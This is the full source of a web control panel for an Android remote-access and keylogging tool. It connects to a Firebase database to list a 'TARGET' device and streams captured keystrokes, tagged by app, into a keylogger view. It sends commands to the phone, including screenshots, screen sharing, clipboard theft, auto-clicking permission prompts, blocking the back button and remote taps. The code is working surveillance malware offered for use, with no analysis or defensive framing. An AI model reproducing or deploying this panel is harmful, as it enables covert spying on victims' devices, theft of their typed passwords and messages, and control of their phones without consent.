<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL SYSTEM CORE v5.0</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --neon: #00ff41; --bg: #050505; --warn: #ffcc00; --crit: #ff3e3e; --blue: #0088ff; }
        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); padding: 15px; margin: 0; font-size: 12px; }
        .container { max-width: 600px; margin: auto; border: 1px solid var(--neon); padding: 10px; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        
        .header { text-align: center; border-bottom: 2px solid var(--neon); margin-bottom: 15px; padding-bottom: 10px; }
        .status-bar { display: flex; justify-content: space-between; font-size: 0.7rem; margin-bottom: 10px; color: var(--blue); }

        .section-title { font-size: 0.8rem; color: var(--warn); margin: 15px 0 5px; text-transform: uppercase; letter-spacing: 1px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; }
        
        button { 
            background: #111; border: 1px solid var(--neon); color: var(--neon); 
            padding: 8px 2px; cursor: pointer; font-size: 0.65rem; font-family: 'Courier New';
        }
        button:hover { background: var(--neon); color: #000; font-weight: bold; }
        button:active { transform: scale(0.95); }
        .danger { border-color: var(--crit); color: var(--crit); }
        .danger:hover { background: var(--crit); color: #fff; }

        input { background: #000; border: 1px solid #444; color: var(--neon); padding: 10px; width: calc(100% - 22px); margin: 5px 0; outline: none; }
        .log-box { background: #000; border: 1px solid #333; height: 120px; overflow-y: auto; padding: 8px; margin-top: 10px; color: #4ade80; font-size: 0.7rem; border-radius: 4px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>CORE_COMMAND_CENTER_v5.0</h2>
    </div>

    <div class="status-bar">
        <span id="targetName">TARGET: SEARCHING...</span>
        <span id="lastSeen">LAST_PING: --:--</span>
    </div>

    <div class="section-title">01. Navigasi & UI</div>
    <div class="grid">
        <button onclick="send('back')">BACK</button>
        <button onclick="send('home')">HOME</button>
        <button onclick="send('recents')">RECENTS</button>
        <button onclick="send('notifications')">NOTIF PANEL</button>
        <button onclick="send('quick_settings')">QUICK SET</button>
        <button onclick="send('power_dialog')">POWER MENU</button>
        <button onclick="send('force_expand_notif')">FULL NOTIF</button>
        <button onclick="send('split_screen')">SPLIT SCR</button>
        <button onclick="send('open_google_assistant')">ASSISTANT</button>
    </div>

    <div class="section-title">02. Interaksi Layar</div>
    <div class="grid">
        <button onclick="send('scroll_down')">SCROLL DN</button>
        <button onclick="send('scroll_up')">SCROLL UP</button>
        <button onclick="send('auto_click_allow')">AUTO ALLOW</button>
        <button onclick="send('lock')">LOCK SCR</button>
        <button onclick="send('screen_on')">WAKE UP</button>
        <button onclick="send('screenshot')">SCREENSHOT</button>
        <button onclick="send('brightness_max')">BRIGHT MAX</button>
        <button onclick="send('brightness_min')">BRIGHT MIN</button>
        <button class="danger" onclick="send('screen_share')">SCREENSHARE</button>
    </div>

    <div class="section-title">03. Hardware & Media</div>
    <div class="grid">
        <button onclick="send('vol_up')">VOL +</button>
        <button onclick="send('vol_down')">VOL -</button>
        <button onclick="send('mute')">MUTE ALL</button>
        <button onclick="send('play_media')">PLAY/PAUSE</button>
        <button onclick="send('next_track')">NEXT</button>
        <button onclick="send('prev_track')">PREV</button>
        <button onclick="send('flash_on')">FLASH ON</button>
        <button onclick="send('flash_off')">FLASH OFF</button>
        <button onclick="send('vibrate')">VIBRATE</button>
    </div>

    <div class="section-title">04. Data & System</div>
    <div class="grid">
        <button onclick="send('copy_clipboard')">COPY ALL</button>
        <button onclick="send('paste_clipboard')">PASTE DATA</button>
        <button onclick="send('open_browser')">OPEN URL</button>
        <button onclick="send('clear_notif')">WIPE NOTIF</button>
        <button onclick="send('disable_back_button')">BLOCK BACK</button>
        <button class="danger" onclick="send('reboot')">REBOOT</button>
    </div>

    <div class="section-title">05. Remote Executor</div>
    <input type="text" id="extraField" placeholder="Data: Package / Link / Coords (X,Y)">
    <div class="grid">
        <button class="danger" onclick="send('open_app', document.getElementById('extraField').value)">OPEN APP</button>
        <button class="danger" onclick="send('tap', document.getElementById('extraField').value)">CLICK XY</button>
        <button class="danger" onclick="send('toast', document.getElementById('extraField').value)">SHOW TOAST</button>
    </div>

    <div class="section-title">Keylogger Log</div>
    <div class="log-box" id="keylogBox">Waiting for keystrokes...</div>

    <div class="section-title">Console Output</div>
    <div class="log-box" id="consoleLog">> Console ready.</div>
</div>

<script>
    // FIREBASE CONFIG
    const firebaseConfig = { databaseURL: "https://remotecontrol-3f4dd-default-rtdb.asia-southeast1.firebasedatabase.app/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // REGISTRATION: Ambil info perangkat pertama kali
    db.ref('devices').limitToFirst(1).on('value', (snap) => {
        const data = snap.val();
        if (data) {
            const id = Object.keys(data)[0];
            document.getElementById('targetName').innerText = `TARGET: ${data[id].model}`;
            document.getElementById('lastSeen').innerText = `OS: ${data[id].android_ver}`;
        }
    });

    // KEYLOGGER: Realtime update
    db.ref('keylogs').on('child_added', (snap) => {
        const log = snap.val();
        const box = document.getElementById('keylogBox');
        box.innerHTML += `<div>[${log.app}] : ${log.text}</div>`;
        box.scrollTop = box.scrollHeight;
    });

    // SEND COMMAND FUNCTION
    function send(action, extra = "") {
        const console = document.getElementById('consoleLog');
        db.ref('commands').set({
            action: action,
            extra: extra,
            time: Date.now(),
            executed: false
        }).then(() => {
            console.innerHTML += `<div>[${new Date().toLocaleTimeString()}] CMD_SENT: ${action}</div>`;
            console.scrollTop = console.scrollHeight;
        });
    }
</script>
</body>
</html>
